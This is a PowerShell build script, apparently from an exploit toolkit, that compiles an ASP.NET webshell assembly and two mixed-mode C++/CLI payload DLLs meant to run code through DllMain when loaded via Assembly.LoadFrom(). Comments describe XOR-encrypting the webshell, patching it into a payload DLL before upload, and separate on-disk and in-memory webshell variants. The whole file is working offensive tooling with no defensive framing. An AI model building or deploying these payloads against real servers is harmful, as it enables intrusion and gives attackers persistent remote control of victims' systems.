# compile_x64.ps1 -- build both IJW payload DLLs (x64) from source.
# Run from the ijw-dll-payload directory on a Windows x64 machine.
#
# The build environment (VS Build Tools 2022 with VCTools + C++/CLI, a Windows
# SDK, and the .NET Framework 4.8 SDK) is resolved by build-env.ps1, which
# detects an existing install and installs any missing component automatically.

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

$payloadDir = Split-Path -Parent $MyInvocation.MyCommand.Path
. (Join-Path $payloadDir "build-env.ps1")

$tools    = Initialize-BuildEnv -Arch "x64" -ScriptDir $payloadDir
$dotnetFx = $tools.DotnetFx

# /TP  treat .c as C++ (payload.c uses C++ features for /clr)
# /clr C++/CLI mixed-mode (IJW) -- DllMain fires on Assembly.LoadFrom()
# /EHa async exception handling (required with /clr)
# /GS- disable buffer security checks (incompatible with /clr without CRT init)
# /AI  additional #using assembly search path (resolves System.Web.dll)
$clFlags   = @("/c", "/GS-", "/nologo", "/TP", "/clr", "/EHa", "/AI", $dotnetFx)
$linkFlags = @("/DLL", "/CLRIMAGETYPE:IJW", "/NOLOGO", "/MACHINE:X64",
               "kernel32.lib", "mscoree.lib", "oleaut32.lib")

# ---- aspx-stub (AnyCPU managed assembly) -----------------------------------
# webshell.dll is AnyCPU -- the exploit XOR-encrypts this and patches it into
# payload_write.dll before upload. Compiled once here; architecture-neutral.

Write-Host ""
Write-Host "[*] Building aspx-stub (AnyCPU) ..."
Push-Location (Join-Path $payloadDir "write-webshell\aspx-stub")
try {
    & $tools.Csc /nologo /target:library /r:"$dotnetFx\System.Web.dll" /out:webshell.dll webshell.cs
    if ($LASTEXITCODE -ne 0) { throw "csc.exe failed for aspx-stub" }

    Write-Host "[+] write-webshell\aspx-stub\webshell.dll"
    Get-Item webshell.dll | Select-Object Name, Length, LastWriteTime
} finally {
    Pop-Location
}

# ---- write-webshell --------------------------------------------------------

Write-Host ""
Write-Host "[*] Building write-webshell (x64) ..."
Push-Location (Join-Path $payloadDir "write-webshell")
try {
    & $tools.Cl @clFlags payload_write.c
    if ($LASTEXITCODE -ne 0) { throw "cl.exe failed for write-webshell" }

    & $tools.Link @linkFlags /out:payload_write.dll payload_write.obj
    if ($LASTEXITCODE -ne 0) { throw "link.exe failed for write-webshell" }

    Write-Host "[+] write-webshell\payload_write.dll"
    Get-Item payload_write.dll | Select-Object Name, Length, LastWriteTime
} finally {
    Pop-Location
}

# ---- inmemory-webshell -----------------------------------------------------

Write-Host ""
Write-Host "[*] Building inmemory-webshell (x64) ..."
Push-Location (Join-Path $payloadDir "inmemory-webshell")
try {
    & $tools.Cl @clFlags payload_inmemory.c
    if ($LASTEXITCODE -ne 0) { throw "cl.exe failed for inmemory-webshell" }

    & $tools.Link @linkFlags /out:payload_inmemory.dll payload_inmemory.obj
    if ($LASTEXITCODE -ne 0) { throw "link.exe failed for inmemory-webshell" }

    Write-Host "[+] inmemory-webshell\payload_inmemory.dll"
    Get-Item payload_inmemory.dll | Select-Object Name, Length, LastWriteTime
} finally {
    Pop-Location
}

Write-Host ""
Write-Host "[+] All x64 payloads built."
